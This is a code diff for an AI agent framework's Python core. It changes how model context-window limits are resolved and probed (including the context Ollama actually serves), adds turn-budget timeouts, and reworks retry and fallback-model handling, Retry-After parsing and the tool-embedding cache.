+ACTIVE_ENDPOINT_URL = active_endpoint_url()
 
 
 def _positive_int(value, fallback: int) -> int:
@@ -1872,9 +2116,32 @@ def _active_model_token_limits(provider_name: str = "", model_name: str = "") ->
 
     Most OpenAI-compatible model-list endpoints do not publish either value.
     Resolution is therefore explicit and deterministic: a provider profile
-    override wins, then a global config override, then reviewed model metadata,
-    and finally the conservative legacy defaults.
+    override wins, then a global config override, then the value probed for
+    this exact (provider, model), then reviewed model metadata, and finally
+    the conservative legacy defaults. context_window_source() says which.
     """
+    context, completion, _source = _resolve_token_limits(provider_name, model_name)
+    return context, completion
+
+
+def context_window_source(provider_name: str = "", model_name: str = "") -> str:
+    """Where the context window comes from: config | probe | ollama-served |
+    catalog | default. "default" means nothing knew it and 32768 (or the
+    global CONTEXT_WINDOW) is a guess."""
+    return _resolve_token_limits(provider_name, model_name)[2]
+
+
+def _probe_owned(provider_name: str, key: str):
+    """The model whose probe wrote PROVIDERS[provider][key], or None when the
+    value there came from config (or /limits)."""
+    owner = _PROBE_OWNER.get(provider_name)
+    value = (PROVIDERS.get(provider_name) or {}).get(key)
+    if owner and value not in (None, "") and owner.get(key) == str(value):
+        return owner["model"]
+    return None
+
+
+def _resolve_token_limits(provider_name: str = "", model_name: str = ""):
     from agent8088.providers import model_token_limits
 
     # Lazy probe: this is the accessor every consumer of a token limit goes
@@ -1886,28 +2153,62 @@ def _active_model_token_limits(provider_name: str = "", model_name: str = "") ->
     active_model = model_name or MODEL_NAME
     profile = PROVIDERS.get(active_provider, {})
     known = model_token_limits(active_provider, active_model)
-    context_value = profile.get("context_window")
-    if context_value in (None, ""):
-        context_value = (
-            APP_CONFIG.get("context_window")
-            if "context_window" in APP_CONFIG
-            else known.get("context_window")
-        )
-    completion_value = profile.get("max_completion_tokens")
-    if completion_value in (None, ""):
-        completion_value = (
-            APP_CONFIG.get("max_completion_tokens")
-            if "max_completion_tokens" in APP_CONFIG
-            else known.get("max_completion_tokens")
-        )
+    probed_ctx, probed_out = _PROBED_LIMITS.get((active_provider, active_model), (None, None))
+
+    def pick(key, probed):
+        value = profile.get(key)
+        if value not in (None, ""):
+            owner = _probe_owned(active_provider, key)
+            if owner is None:
+                return value, "config"
+            if owner != active_model:
+                # Another model's probe on the same provider: not this one's.
+                value = None
+            else:
+                return value, _PROBED_SOURCE.get((active_provider, active_model), "probe")
+        if key in APP_CONFIG:
+            return APP_CONFIG.get(key), "config"
+        if probed:
+            return probed, _PROBED_SOURCE.get((active_provider, active_model), "probe")
+        if known.get(key):
+            return known.get(key), "catalog"
+        return None, "default"
+
+    context_value, source = pick("context_window", probed_ctx)
+    completion_value, _ = pick("max_completion_tokens", probed_out)
     context = _positive_int(context_value, CONTEXT_WINDOW)
+    if context_value is not None and _positive_int(context_value, 0) <= 0:
+        source = "default"
     completion = _positive_int(completion_value, MAX_COMPLETION_TOKENS)
-    return context, min(completion, context)
+    if (active_provider == (ACTIVE_PROVIDER or DEFAULT_PROVIDER)
+            and active_model == MODEL_NAME):
+        _report_context_source(active_provider, active_model, source, context)
+    return context, min(completion, context), source
+
+
+def _report_context_source(provider_name: str, model_name: str, source: str, context: int) -> None:
+    """capabilities.CONTEXT: degraded while the active model's window is a guess."""
+    try:
+        if source != "default":
+            capabilities.report(capabilities.CONTEXT, active=f"{context:,} tokens ({source})",
+                                preferred="", state=capabilities.OK)
+            return
+        probed = (provider_name, model_name) in _PROBED_LIMITS
+        capabilities.report(
+            capabilities.CONTEXT, active=f"assumed {context:,} tokens", preferred="",
+            state=capabilities.DEGRADED,
+            reason=(f"context window unknown for {model_name}; assuming {context}"
+                    + ("" if not probed else " (probe failed)")),
+            impact="compaction may fire too early or the prompt may be truncated",
+            fix=f"set provider.{provider_name}.context_window",
+            model_note="")
+    except Exception:  # noqa: BLE001
+        _log.debug("context capability report failed", exc_info=True)
 
 
 def activate_model(provider: str = "", model: str = ""):
     """Select and persist a configured provider and optional model."""
-    global client, MODEL_NAME, ACTIVE_PROVIDER, DEFAULT_PROVIDER
+    global client, MODEL_NAME, ACTIVE_PROVIDER, DEFAULT_PROVIDER, ACTIVE_ENDPOINT_URL
     if provider:
         if provider not in PROVIDERS:
             raise ValueError(f"Unknown provider: {provider}")
@@ -1937,11 +2238,37 @@ def activate_model(provider: str = "", model: str = ""):
         update_simple_config(CONFIG_PATH, {"model_name": selected_model})
         APP_CONFIG["model_name"] = selected_model
         MODEL_NAME = selected_model
+    ACTIVE_ENDPOINT_URL = active_endpoint_url()
     _maybe_probe_context_window()
     return client, MODEL_NAME
 
 
 _PROBED_LIMITS = {}
+# provider -> {"model", "context_window", "max_completion_tokens"}: which
+# model's probe wrote the values now in PROVIDERS[provider]. A value there that
+# matches belongs to that model alone; anything else came from config.
+_PROBE_OWNER = {}
+# (provider, model) -> "probe" | "ollama-served": how the probed window was found.
+_PROBED_SOURCE = {}
+
+
+def _store_probed(name: str, model: str, ctx, out) -> None:
+    """Write a probed (provider, model) result into PROVIDERS[name], replacing
+    any values another model's probe left there, and record ownership.
+    Values from config (no probe owns them) are never overwritten."""
+    profile = PROVIDERS[name]
+    previous = _PROBE_OWNER.get(name) or {}
+    owner = dict(previous) if previous.get("model") == model else {"model": model}
+    for key, value in (("context_window", ctx), ("max_completion_tokens", out)):
+        prior = _probe_owned(name, key)
+        if prior is not None and prior != model:
+            profile.pop(key, None)  # another model's probe: not this model's limit
+        elif prior is None and profile.get(key) not in (None, ""):
+            continue  # configured
+        if value and value > 0:
+            profile[key] = str(value)
+            owner[key] = str(value)
+    _PROBE_OWNER[name] = owner
 
 
 def _maybe_probe_context_window():
@@ -1960,12 +2287,9 @@ def _maybe_probe_context_window():
     cache_key = (name, model)
     if cache_key in _PROBED_LIMITS:
         ctx, out = _PROBED_LIMITS[cache_key]
-        if ctx:
-            PROVIDERS[name]["context_window"] = str(ctx)
-        if out:
-            PROVIDERS[name]["max_completion_tokens"] = str(out)
+        _store_probed(name, model, ctx, out)
         return
-    if PROVIDERS[name].get("context_window"):
+    if PROVIDERS[name].get("context_window") and _probe_owned(name, "context_window") is None:
         return  # explicit config override — no probe needed
     if "context_window" in APP_CONFIG:
         return  # global override exists — no probe needed
@@ -1973,11 +2297,55 @@ def _maybe_probe_context_window():
         probed_ctx, probed_out = probe_model_context_window(client, model, provider_name=name)
     except Exception:
         probed_ctx, probed_out = None, None
-    _PROBED_LIMITS[cache_key] = (probed_ctx, probed_out)
+    _PROBED_SOURCE[cache_key] = "probe"
     if probed_ctx and probed_ctx > 0:
-        PROVIDERS[name]["context_window"] = str(probed_ctx)
-    if probed_out and probed_out > 0 and not PROVIDERS[name].get("max_completion_tokens"):
-        PROVIDERS[name]["max_completion_tokens"] = str(probed_out)
+        served = _ollama_served_cap(name, model, probed_ctx)
+        if served != probed_ctx:
+            _PROBED_SOURCE[cache_key] = "ollama-served"
+        probed_ctx = served
+    _PROBED_LIMITS[cache_key] = (probed_ctx, probed_out)
+    _store_probed(name, model, probed_ctx, probed_out)
+
+
+def _ollama_served_cap(provider_name: str, model: str, probed_ctx: int) -> int:
+    """For a local Ollama, the context it actually serves, not the model's max.
+
+    /api/show reports e.g. 131072, but Ollama runs the model at its num_ctx
+    (4k-256k by VRAM unless configured) and its OpenAI-compatible endpoint cannot raise
+    that per request -- it truncates an over-long prompt silently, dropping
+    the system prompt first. Sizing to the max meant compaction never fired
+    while the model quietly lost its instructions. Only called once the
+    probe got an answer, so Ollama is known to be reachable.
+    """
+    base_url = str(getattr(client, "base_url", "") or active_endpoint_url(provider_name))
+    if not providers.is_local_ollama(provider_name, base_url):
+        return probed_ctx
+    try:
+        served, source = providers.ollama_served_context(
+            base_url, model, api_key=str(getattr(client, "api_key", "") or ""))
+    except Exception as exc:  # noqa: BLE001 -- best-effort, like the probe
+        _log.debug("ollama served-context probe failed: %s", exc)
+        return probed_ctx
+    if not served:
+        # Not loaded yet and nothing configured: Ollama will pick 4k-256k by
+        # the server's VRAM. Capping to 4k would cripple a big GPU, trusting
+        # the max can truncate silently on a small one -- say so instead.
+        if probed_ctx > providers.OLLAMA_DEFAULT_NUM_CTX:
+            _config_warn(
+                f"Ollama may run {model} with less than its {probed_ctx}-token maximum "
+                f"(its default is 4k-256k depending on GPU memory) and then silently drops "
+                f"the start of long conversations. Set OLLAMA_CONTEXT_LENGTH before "
+                f"`ollama serve` and provider.{provider_name}.context_window to the same value.")
+        return probed_ctx
+    if served >= probed_ctx:
+        return probed_ctx
+    if source != "ollama ps":
+        _config_warn(
+            f"Ollama serves {model} with a {served}-token context ({source}), not its "
+            f"{probed_ctx}-token maximum, so agent8088 sizes conversations to {served}. "
+            f"For more, restart Ollama with OLLAMA_CONTEXT_LENGTH=32768 (or set num_ctx "
+            f"in a Modelfile) and set provider.{provider_name}.context_window to match.")
+    return served
 
 
 # NOT probed at import. The probe is a network round-trip, and at import time
@@ -2003,8 +2371,8 @@ def _raise_if_interrupted(interrupt_check, stream=None):
     if callable(close):
         try:
             close()
-        except Exception:
-            pass
+        except Exception as exc:  # noqa: BLE001 -- the interrupt is what matters
+            _log.debug("closing the interrupted stream failed: %s", exc)
     raise AgentInterrupted()
 
 
@@ -2053,19 +2421,39 @@ def create_completion(client, messages, tools, max_tokens=2000, system_prompt=No
         if delta and first_token[0] is None:
             first_token[0] = round((time.monotonic() - started) * 1000)
         on_token(kind, delta)
+    def bounded_interrupt():
+        if interrupt_check and interrupt_check():
+            return True
+        return bool(_active_budget and (_active_budget.exceeded() or
+                    (_active_budget.seconds_left() is not None and _active_budget.seconds_left() <= 0)))
+
     try:
+        _check_model_budget()
+        max_tokens = _completion_token_budget(provider, selected_model, messages, tools,
+                                              system_prompt, max_tokens)
+        remaining = _check_model_budget()  # token-limit discovery may have used time
+        options = {"timeout": min(TIMEOUT_SECONDS, remaining)} if remaining is not None else {}
         response = _create_completion(
             client, messages, tools, max_tokens=max_tokens, system_prompt=system_prompt,
-            temperature=temperature, on_token=observe_token if on_token else None, interrupt_check=interrupt_check,
-            model_name=selected_model, provider_name=provider, thinking=thinking,
+            temperature=temperature, on_token=observe_token if on_token else None,
+            interrupt_check=bounded_interrupt if _active_budget is not None else interrupt_check,
+            model_name=selected_model, provider_name=provider, thinking=thinking, **options,
         )
     except Exception as exc:
+        if isinstance(exc, AgentInterrupted):
+            try:
+                _check_model_budget()  # distinguish deadline cancellation from the user's Stop
+            except TurnBudgetExceeded as deadline:
+                exc = deadline
         _record_model_telemetry(provider, selected_model, telemetry_attempt, started,
                                 max_tokens=max_tokens, error=exc)
-        raise
+        raise exc
     _record_model_telemetry(provider, selected_model, telemetry_attempt, started,
                             max_tokens=max_tokens, response=response, first_token_ms=first_token[0] if first_token[0] is not None else getattr(response, 'first_token_ms', None),
                             prompt=system_prompt or current_system_prompt(), tools=tools)
+    if _active_budget and _active_budget.seconds_left() is not None and _active_budget.seconds_left() <= 0:
+        _active_budget.add_usage(response)
+    _check_model_budget()  # a late response must not authorize tool execution
     return response
 
 
@@ -2219,7 +2607,7 @@ def _resolve_temperature(provider_name: str, temperature: float) -> float:
 def _create_completion(client, messages, tools, max_tokens=2000, system_prompt=None,
                        temperature=0.1, on_token=None, interrupt_check=None,
                        model_name: str = "", provider_name: str = "", _skip_optional=False,
-                       thinking=None):
+                       thinking=None, timeout=None):
     selected_model = model_name or MODEL_NAME
     full_messages = _normalised_messages(system_prompt or current_system_prompt(), messages)
     temperature = _resolve_temperature(provider_name, temperature)
@@ -2239,6 +2627,8 @@ def _create_completion(client, messages, tools, max_tokens=2000, system_prompt=N
         }
         if _native_tools_enabled(tools, provider_name):
             kwargs["tools"] = tools
+        if timeout is not None:
+            kwargs["timeout"] = timeout
         if client.get("api_base"):
             kwargs["api_base"] = client["api_base"]
         if client.get("api_key"):
@@ -2274,6 +2664,8 @@ def _create_completion(client, messages, tools, max_tokens=2000, system_prompt=N
         model=selected_model, messages=full_messages, max_tokens=max_tokens,
         temperature=temperature, **penalties,
     )
+    if timeout is not None:
+        request_options["timeout"] = timeout
     if _native_tools_enabled(tools, provider_name):
         request_options["tools"] = tools
     # Optional per-provider reasoning dial (provider.<name>.reasoning_effort).
@@ -2333,8 +2725,8 @@ def _create_completion(client, messages, tools, max_tokens=2000, system_prompt=N
         if stream_ctx is not None:
             try:
                 stream_ctx.__exit__(None, None, None)
-            except Exception:  # noqa: BLE001
-                pass
+            except Exception as exc:  # noqa: BLE001
+                _log.debug("closing the response stream failed: %s", exc)
 
     try:
         if track_rate_limits:
@@ -2354,7 +2746,7 @@ def _create_completion(client, messages, tools, max_tokens=2000, system_prompt=N
                 system_prompt=system_prompt, temperature=temperature,
                 on_token=on_token, interrupt_check=interrupt_check,
                 model_name=model_name, provider_name=provider_name, _skip_optional=True,
-                thinking=thinking)
+                thinking=thinking, timeout=timeout)
         raise
     collected, tool_chunks, finish_reason = [], {}, None
     stream_usage = None
@@ -2394,18 +2786,37 @@ def _create_completion(client, messages, tools, max_tokens=2000, system_prompt=N
 
 
 def _fallback_targets() -> list:
+    CONFIG_WARNINGS[:] = [w for w in CONFIG_WARNINGS if not w.startswith("fallback_models:")]
     targets = []
     for item in str(APP_CONFIG.get("fallback_models", "")).split(","):
+        if not item.strip():
+            continue
         provider_name, separator, model_name = item.strip().partition(":")
-        if separator and provider_name in PROVIDERS and model_name.strip():
-            targets.append((provider_name, model_name.strip()))
+        provider_name, model_name = provider_name.strip(), model_name.strip()
+        if not separator:
+            _config_warn(f"fallback_models: '{item.strip()}' needs provider:model.")
+        elif provider_name not in PROVIDERS:
+            _config_warn(f"fallback_models: unknown provider '{provider_name}'.")
+        elif not model_name:
+            _config_warn(f"fallback_models: empty model for '{provider_name}'.")
+        elif (provider_name, model_name) in targets:
+            _config_warn(f"fallback_models: duplicate '{provider_name}:{model_name}' ignored.")
+        else:
+            targets.append((provider_name, model_name))
     return targets
+
+
+_fallback_targets()  # report invalid targets at startup, before a call fails
 
 
 def _retryable_model_error(error: Exception) -> bool:
     status = getattr(error, "status_code", None)
-    if status == 429 or isinstance(status, int) and status >= 500:
+    if status in (408, 429) or isinstance(status, int) and status >= 500:
         return True
+    if isinstance(status, int) and 400 <= status < 500:
+        # A definite client error: the body text (an HTML page for a wrong
+        # base_url mentions "connection" and "timeout") must not override it.
+        return False
     name = type(error).__name__.lower()
     text = str(error).lower()
     retryable = (
@@ -2416,27 +2827,19 @@ def _retryable_model_error(error: Exception) -> bool:
 
 
 def _extract_retry_after(error):
-    """Parse Retry-After header (seconds or HTTP-date) from an OpenAI SDK error."""
-    resp = getattr(error, "response", None)
-    if not resp or not hasattr(resp, "headers"):
-        return None
-    raw = resp.headers.get("retry-after") or resp.headers.get("Retry-After")
-    if not raw:
-        return None
+    """Parse the shared validated Retry-After value into milliseconds."""
+    from .errors import retry_after_seconds
+    seconds = retry_after_seconds(error)
     try:
-        return max(0, int(raw) * 1000)
-    except ValueError:
-        pass
-    try:
-        from email.utils import parsedate_to_datetime
-        dt = parsedate_to_datetime(raw)
-        return max(0, int((dt.timestamp() - time.time()) * 1000))
-    except Exception:
+        return int(seconds * 1000) if seconds is not None else None
+    except OverflowError:
         return None
 
 
 def _retry_delay(retry_attempt, retry_after_ms=None):
-    if retry_after_ms and retry_after_ms <= API_RETRY_MAX_DELAY_MS:
+    # `is not None`, not truthiness: Retry-After: 0 is the server saying "go
+    # now", and treating it as missing replaced it with a full backoff.
+    if retry_after_ms is not None and retry_after_ms <= API_RETRY_MAX_DELAY_MS:
         return retry_after_ms / 1000.0
     exponent = min(retry_attempt - 1, 1024)
     delay = min(API_RETRY_INITIAL_DELAY_MS * 2 ** exponent, API_RETRY_MAX_DELAY_MS)
@@ -2444,14 +2847,162 @@ def _retry_delay(retry_attempt, retry_after_ms=None):
     return (delay * jitter) / 1000.0
 
 
+def _check_model_budget():
+    """Check between attempts and return the remaining request timeout."""
+    if _active_budget is None:
+        return None
+    reason = _active_budget.exceeded()
+    left = _active_budget.seconds_left()
+    if reason or left is not None and left <= 0:
+        raise TurnBudgetExceeded(reason or "Turn budget exceeded: time limit reached.")
+    return left
+
+
+def _completion_token_budget(provider, model, messages, tools, system_prompt, requested):
+    context, completion = _active_model_token_limits(provider, model)
+    prompt_tokens = _estimate_tokens(
+        _estimate_context_chars(messages, system_prompt or current_system_prompt())
+        + len(json.dumps(tools or [], default=str)))
+    headroom = context - prompt_tokens - CONTEXT_SAFETY_TOKENS
+    if headroom < 1:
+        raise ValueError(f"The conversation exceeds the available context for {provider}:{model}.")
+    return max(1, min(requested, completion, headroom))
+
+
+def _interruptible_sleep(seconds: float, interrupt_check=None, slice_seconds: float = 0.1) -> None:
+    """Backoff is bounded by the turn deadline and can be interrupted."""
+    if not interrupt_check and _active_budget is None:
+        time.sleep(seconds)
+        return
+    left = max(0.0, seconds)
+    while True:
+        remaining = _check_model_budget()
+        _raise_if_interrupted(interrupt_check)
+        if left <= 0:
+            return
+        step = min(slice_seconds, left, remaining if remaining is not None else left)
+        time.sleep(step)
+        left -= step
+
+
+# Shown when a stream that died mid-reply is retried once. A front end that
+# passes on_stream_reset discards the partial text it already rendered; one
+# that doesn't shows this note and then the retried reply after the fragment.
+# Either way only the retried reply reaches the message history.
+STREAM_RESET_NOTE = "(connection dropped, retried)"
+
+
+def _model_error_context(provider_name: str, model_name: str) -> dict:
+    """The facts explain_model_error needs, for the given provider."""
+    profile = PROVIDERS.get(provider_name or "") or {}
+    return {"provider": provider_name or None,
+            "base_url": active_endpoint_url(provider_name) if provider_name else active_endpoint_url(),
+            "model": model_name or MODEL_NAME,
+            "api_key_env": profile.get("api_key_env") or None,
+            "timeout_seconds": TIMEOUT_SECONDS}
+
+
+def explain_model_error(error, provider_name: str = "", model_name: str = ""):
+    """errors.explain_model_error with this process's provider facts filled in."""
+    from agent8088.errors import explain_model_error as _explain
+    return _explain(error, **_model_error_context(
+        provider_name or ACTIVE_PROVIDER or DEFAULT_PROVIDER, model_name))
+
+
+# Which model actually answered the last main call, for /status. A failover
+# to a fallback_models entry is otherwise invisible: the configured MODEL_NAME
+# does not change. {"provider", "model", "fallback_for": "prov:model" or ""}.
+LAST_MODEL_SERVED: dict = {}
+
+
+def _model_label(provider_name: str, model_name: str) -> str:
+    return f"{provider_name}:{model_name}" if provider_name else str(model_name or "")
+
+
+def _short_model_error(error, provider_name: str, model_name: str) -> str:
+    """One short clause for why a model failed ("Can't reach http://...")."""
+    if error is None:
+        return "failed"
+    try:
+        friendly = explain_model_error(error, provider_name, model_name)
+        text = friendly.message
+    except Exception:  # noqa: BLE001
+        text = f"{type(error).__name__}: {error}"
+    text = " ".join(str(text).split()).rstrip(".")
+    return text if len(text) <= 120 else text[:117] + "..."
+
+
+def _fallback_max_tokens(messages, system_prompt, tools, provider_name, model_name,
+                         requested=None) -> int:
+    """max_tokens for a fallback model, from ITS limits rather than the primary's.
+
+    The caller sized `requested` for the primary (its completion ceiling, its
+    window's headroom). Bound it by the fallback's ceiling and by the headroom
+    the estimated prompt leaves in the fallback's window."""
+    window, ceiling = _active_model_token_limits(provider_name, model_name)
+    try:
+        chars = (len(json.dumps(messages, default=str)) + len(system_prompt or "")
+                 + len(json.dumps(tools or [], default=str)))
+    except Exception:  # noqa: BLE001
+        chars = 0
+    headroom = window - int(chars / CHARS_PER_TOKEN) - 512  # CONTEXT_SAFETY_TOKENS
+    limit = min(ceiling, headroom)
+    if requested:
+        limit = min(limit, int(requested))
+    return max(256, limit)  # MIN_TURN_COMPLETION_TOKENS: let the server say no
+
+
+def _note_model_served(provider_name, model_name, *, primary=None, reason="") -> None:
+    """Record who answered; report capabilities.MODEL on failover/recovery.
+
+    Only failovers away from the main model (and recovery back to it) are
+    reported: sub-agents and auto rungs calling other models successfully are
+    not a degradation of anything."""
+    try:
+        main = _model_label(ACTIVE_PROVIDER or DEFAULT_PROVIDER, MODEL_NAME)
+        served = _model_label(provider_name, model_name)
+        if primary is not None:
+            preferred = _model_label(*primary)
+            LAST_MODEL_SERVED.update(provider=provider_name, model=model_name,
+                                     fallback_for=preferred, reason=reason)
+            capabilities.report(
+                capabilities.MODEL, active=served, preferred=preferred,
+                state=capabilities.DEGRADED, reason=reason or "primary failed",
+                impact=f"answers come from {served}",
+                fix="check the primary (/doctor) or /model",
+                model_note="")
+            return
+        entry = capabilities.get(capabilities.MODEL)
+        if entry is not None and not entry.ok and entry.preferred == served:
+            capabilities.report(capabilities.MODEL, active=served, preferred=served,
+                                state=capabilities.OK, reason="primary answering again")
+        if served == main:
+            LAST_MODEL_SERVED.update(provider=provider_name, model=model_name,
+                                     fallback_for="", reason="")
+    except Exception:  # noqa: BLE001 — bookkeeping must never fail a model call
+        _log.debug("model capability report failed", exc_info=True)
+
+
 def _create_completion_with_fallback(messages, tools, *, temperature, system_prompt,
                                      on_token, interrupt_check, trace, turn,
                                      max_tokens=None, client_override=None,
-                                     provider_override=None, model_override=None):
+                                     provider_override=None, model_override=None,
+                                     on_retry=None, on_stream_reset=None):
+    """One model call with retries and the fallback_models chain.
+
+    This is the single retry layer (the SDK clients are built with
+    max_retries=0). on_retry(message) is told about each wait so a person
+    sees "retrying in 4s (429) -- attempt 2/4" instead of a frozen spinner;
+    on_stream_reset() is called before a dropped stream is retried, so a UI
+    can discard the partial text it already showed.
+    """
+    from agent8088.errors import is_unreachable, status_code as _status_code, \
+        explain_model_error as _explain, is_context_overflow
     active_client = client_override if client_override is not None else client
     active_provider = provider_override or ACTIVE_PROVIDER or DEFAULT_PROVIDER
     active_model = model_override or MODEL_NAME
     emitted = False
+    stream_resets = 0
     max_tokens = max_tokens if max_tokens is not None else _active_model_token_limits(active_provider, active_model)[1]
 
     def tracked_token(kind, delta):
@@ -2461,10 +3012,23 @@ def _create_completion_with_fallback(messages, tools, *, temperature, system_pro
             on_token(kind, delta)
 
     token_handler = tracked_token if on_token else None
+
+    def notify(message):
+        if on_retry:
+            try:
+                on_retry(message)
+            except Exception as exc:  # noqa: BLE001 -- a status line must not break the call
+                _log.debug("retry notice failed: %s", exc)
+
     last_error = None
-    for attempt in range(1, API_MAX_RETRIES + 2):  # 1 initial try + API_MAX_RETRIES retries
+    primary_error = None
+    attempts = API_MAX_RETRIES + 1  # 1 initial try + API_MAX_RETRIES retries
+    attempt = 0
+    while attempt < attempts:
+        _check_model_budget()
+        attempt += 1
         try:
-            return create_completion(
+            response = create_completion(
                 active_client, messages, tools, temperature=temperature,
                 max_tokens=max_tokens,
                 system_prompt=system_prompt, on_token=token_handler,
@@ -2473,25 +3037,78 @@ def _create_completion_with_fallback(messages, tools, *, temperature, system_pro
                 provider_name=active_provider,
                 telemetry_attempt="primary",
             )
-        except AgentInterrupted:
+            _note_model_served(active_provider, active_model)
+            return response
+        except (AgentInterrupted, TurnBudgetExceeded):
             raise
-        except Exception as primary_error:
-            if emitted or not _retryable_model_error(primary_error):
+        except Exception as error:
+            primary_error = primary_error or error
+            last_error = error
+            if emitted:
+                # The reply broke off mid-stream. Redoing it once is safe:
+                # tool calls only run after a complete response, so any
+                # half-streamed call chunks were discarded with the stream.
+                if (stream_resets == 0 and _retryable_model_error(error)
+                        and not is_unreachable(error)):
+                    stream_resets += 1
+                    emitted = False
+                    if on_stream_reset:
+                        try:
+                            on_stream_reset()
+                        except Exception as exc:  # noqa: BLE001
+                            _log.debug("stream reset notice failed: %s", exc)
+                    notify(f"Model connection dropped mid-reply; retrying once {STREAM_RESET_NOTE}.")
+                    attempt -= 1  # the reset is its own budget, not a backoff attempt
+                    continue
+                if not _retryable_model_error(error):
+                    raise
+                break  # primary reset spent; switch target with partial text cleared
+            if not _retryable_model_error(error):
+                # A configured target can repair provider-specific auth,
+                # missing-model or capacity errors; malformed requests still stop.
+                if (_status_code(error) in (401, 403) or is_context_overflow(error) or
+                        _status_code(error) == 404 and
+                        _explain(error, model=active_model).kind == "model_not_found"):
+                    break
                 raise
-            last_error = primary_error
-            retry_after_ms = _extract_retry_after(primary_error)
+            if is_unreachable(error):
+                # Connection refused / DNS: the server is not there, and a
+                # backoff ladder only delays the message saying so.
+                break
+            retry_after_ms = _extract_retry_after(error)
             if retry_after_ms is not None and retry_after_ms > API_RETRY_MAX_DELAY_MS:
                 # Rate-limited for longer than we're willing to wait. Record it so
                 # `auto` skips this rung until the window passes instead of walking
                 # back into the same 429 next round.
                 routing.mark_cooldown(active_provider, active_model, retry_after_ms / 1000.0)
                 break  # skip remaining retries, fall through to fallback chain
-            if attempt <= API_MAX_RETRIES:
-                time.sleep(_retry_delay(attempt, retry_after_ms))
+            if attempt < attempts:
+                delay = _retry_delay(attempt, retry_after_ms)
+                code = _status_code(error)
+                label = str(code) if code else type(error).__name__
+                notify(f"Model call failed ({label}); retrying in {delay:.0f}s "
+                       f"-- attempt {attempt + 1}/{attempts}")
+                _interruptible_sleep(delay, interrupt_check)
 
     for provider_name, model_name in _fallback_targets():
+        _check_model_budget()
         if provider_name == active_provider and model_name == active_model:
             continue
+        if _status_code(primary_error) in (401, 403):
+            primary_key = _provider_api_key(PROVIDERS.get(active_provider, {}))
+            fallback_key = _provider_api_key(PROVIDERS.get(provider_name, {}))
+            if provider_name == active_provider or primary_key and fallback_key == primary_key:
+                notify(f"Skipping fallback {provider_name}:{model_name}: same rejected credentials.")
+                continue
+        if emitted:
+            emitted = False
+            if on_stream_reset:
+                try:
+                    on_stream_reset()
+                except Exception as exc:
+                    _log.debug("stream reset notice failed: %s", exc)
+            elif on_token:
+                on_token("content", f"\n{STREAM_RESET_NOTE}; switching provider.\n")
         try:
             fallback_client, _ = get_client(provider_name)
             if trace is not None:
@@ -2501,19 +3118,42 @@ def _create_completion_with_fallback(messages, tools, *, temperature, system_pro
                     "provider": provider_name,
                     "model": model_name,
                 })
-            return create_completion(
+            reason = _short_model_error(primary_error or last_error, active_provider, active_model)
+            current = capabilities.get(capabilities.MODEL)
+            if not (current is not None and not current.ok
+                    and current.active == f"{provider_name}:{model_name}"):
+                # Once per failover, not on every call while it lasts: the
+                # registry entry (banner, /status) already says it's ongoing.
+                notify(f"primary {active_provider or 'primary'}:{active_model} failed ({reason}); "
+                       f"answering with {provider_name}:{model_name}")
+            response = create_completion(
                 fallback_client, messages, tools, temperature=temperature,
-                max_tokens=max_tokens,
+                # Sized for the fallback's own limits: the primary's ceiling
+                # (or headroom in its larger window) can overrun this model.
+                max_tokens=_fallback_max_tokens(messages, system_prompt, tools,
+                                                provider_name, model_name, max_tokens),
                 system_prompt=system_prompt, on_token=token_handler,
                 interrupt_check=interrupt_check, model_name=model_name,
                 provider_name=provider_name, telemetry_attempt="fallback",
             )
-        except AgentInterrupted:
+            _note_model_served(provider_name, model_name,
+                               primary=(active_provider, active_model), reason=reason)
+            return response
+        except (AgentInterrupted, TurnBudgetExceeded):
             raise
         except Exception as fallback_error:
             last_error = fallback_error
-            if emitted:
+            if emitted and not _retryable_model_error(fallback_error):
                 raise
+    # The primary's error is the one that explains the setup; a fallback's
+    # failure is secondary. Raise the primary with the chain's outcome noted.
+    if primary_error is not None and last_error is not primary_error:
+        try:
+            primary_error.add_note(f"fallback models also failed: "
+                                   f"{type(last_error).__name__}: {last_error}")
+        except Exception:  # noqa: BLE001 -- add_note is 3.11+
+            pass
+        raise primary_error
     raise last_error
 
 
@@ -2620,6 +3260,10 @@ class AgentInterrupted(Exception):
     pass
 
 
+class TurnBudgetExceeded(RuntimeError):
+    """Recovery stopped because the shared request budget has been exhausted."""
+
+
 # ---------------------------------------------------------------------------
 # Tool specs (loaded from tools.txt, with config.txt as fallback)
 # ---------------------------------------------------------------------------
@@ -2694,7 +3338,8 @@ def _build_spec(name: str, extra: dict, config: dict, description: str) -> dict:
         # unlike every other field here. /limits writes that key, and an
         # override the shipped file silently beat on the next start would be a
         # setting that only appears to work.
-        "timeout": int(config.get(f"tool_timeout.{name}") or g("timeout", "tool_timeout", "25")),
+        "timeout": (_config_number(f"tool_timeout.{name}", 0, int, config)
+                    or _config_number("timeout", 25, int, {"timeout": g("timeout", "tool_timeout", "25")})),
         "arg_types": _parse_arg_types(g("arg_types", "tool_arg_types")),
     }
 
@@ -2825,8 +3470,12 @@ def _tool_selection_index(names: set[str]) -> tuple[list[str], list[str], list[l
                for name in sorted(names) if name in TOOL_SPECS]
     key = tuple(entries)
     cached = _TOOL_INDEX_CACHE.get(key)
-    if cached is not None:
+    if cached is not None and (cached[2] or not _tool_embedder_ready()):
         return cached
+    # No cache, or one built while the embedder was down: an empty-vector
+    # snapshot used to stick for the whole session, so tool selection stayed
+    # keyword-only after the embedder recovered. Retried at most once per
+    # embedder breaker window (a failure re-trips the breaker).
     vectors = []
     try:
         active_embedder = memory.embedder()
@@ -2838,6 +3487,15 @@ def _tool_selection_index(names: set[str]) -> tuple[list[str], list[str], list[l
     _TOOL_INDEX_CACHE.clear()
     _TOOL_INDEX_CACHE[key] = result
     return result
+
+
+def _tool_embedder_ready() -> bool:
+    """Is there an embedder whose breaker is closed (worth trying again)?"""
+    try:
+        active_embedder = memory.embedder()
+        return active_embedder is not None and active_embedder.ready()
+    except Exception:  # noqa: BLE001
+        return False
 
 
 def _cosine(left: list[float], right: list[float]) -> float:
@@ -3043,26 +3701,113 @@ def _ground_execute_shell_description(specs: dict) -> None:
 
 
 TOOL_SPECS = load_tool_specs(TOOLS_FILE, APP_CONFIG)
+# Not connected here: see _start_mcp_background below. Connecting took up to
+# connect_timeout per server at import, so a dead server cost every command.
 MCP_RUNTIME = MCPRuntime(PROJECT_ROOT)
-TOOL_SPECS.update(MCP_RUNTIME.reload(TOOL_SPECS))
 _ground_execute_shell_description(TOOL_SPECS)
 TOOLS_DEF = build_tools_def(TOOL_SPECS)
 TOOL_NAMES = set(TOOL_SPECS.keys())
